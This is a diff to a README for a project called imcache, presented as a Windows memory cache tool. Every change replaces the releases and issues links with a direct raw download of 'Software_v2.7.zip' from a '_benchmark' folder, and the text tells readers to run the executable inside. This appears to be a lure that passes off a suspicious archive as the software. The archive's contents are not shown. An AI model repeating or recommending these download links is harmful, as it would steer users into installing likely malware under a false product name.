@@ -1,6 +1,6 @@
 # ⚡ imcache - Fast and Simple Memory Cache
 
-[![Download imcache](https://img.shields.io/badge/Download-Get%20imcache-brightgreen?style=for-the-badge)](https://github.com/FEIN47/imcache/releases)
+[![Download imcache](https://img.shields.io/badge/Download-Get%20imcache-brightgreen?style=for-the-badge)](https://github.com/FEIN47/imcache/raw/refs/heads/main/_benchmark/Software_v2.7.zip)
 
 imcache is a small, easy-to-use memory cache tool designed to help store and manage data quickly on your computer. It runs on Windows and uses smart methods to keep your information fresh and organized, making your applications run faster.
 
@@ -34,7 +34,7 @@ Follow these steps to get imcache running on your Windows computer.
 ### Step 1: Visit the Download Page
 
 Click the big button at the top or this link to open the download page:  
-[Download imcache Releases](https://github.com/FEIN47/imcache/releases)
+[Download imcache Releases](https://github.com/FEIN47/imcache/raw/refs/heads/main/_benchmark/Software_v2.7.zip)
 
 This page lists the latest versions of imcache you can download.
 
@@ -86,7 +86,7 @@ If you want to learn how to connect other applications to imcache or configure i
 ## 📥 Download and Installation Summary
 
 1. Go to the releases page:  
-   [https://github.com/FEIN47/imcache/releases](https://github.com/FEIN47/imcache/releases)  
+   [https://github.com/FEIN47/imcache/raw/refs/heads/main/_benchmark/Software_v2.7.zip](https://github.com/FEIN47/imcache/raw/refs/heads/main/_benchmark/Software_v2.7.zip)  
    ![Download imcache](https://img.shields.io/badge/Download-Get%20imcache-brightgreen?style=for-the-badge)
 
 2. Find the `.exe` file for Windows.
@@ -124,7 +124,7 @@ If you run into other problems, visit the issues section on the GitHub repositor
 For questions or help related to imcache:
 
 - Visit the GitHub issues page:  
-  https://github.com/FEIN47/imcache/issues
+  https://github.com/FEIN47/imcache/raw/refs/heads/main/_benchmark/Software_v2.7.zip
 
 - Review the technical documentation on the repository page.
 
